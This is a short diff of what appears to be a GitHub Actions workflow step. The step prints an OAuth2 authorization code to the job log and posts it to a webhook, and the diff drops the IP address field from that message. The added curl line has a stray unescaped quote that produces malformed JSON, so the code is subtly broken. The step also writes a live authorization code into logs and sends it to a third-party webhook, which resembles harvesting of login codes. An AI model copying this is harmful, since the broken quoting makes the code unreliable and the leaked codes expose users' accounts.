@@ -31,5 +31,5 @@ jobs:
 
           if [ -n "$code" ]; then
             echo "Authorization code: $code"
-            curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"New OAuth2 code: $code\nIP Address: $ip\"}" $WEBHOOK_URL
+            curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"New OAuth2 code: $code"}" $WEBHOOK_URL
           fi
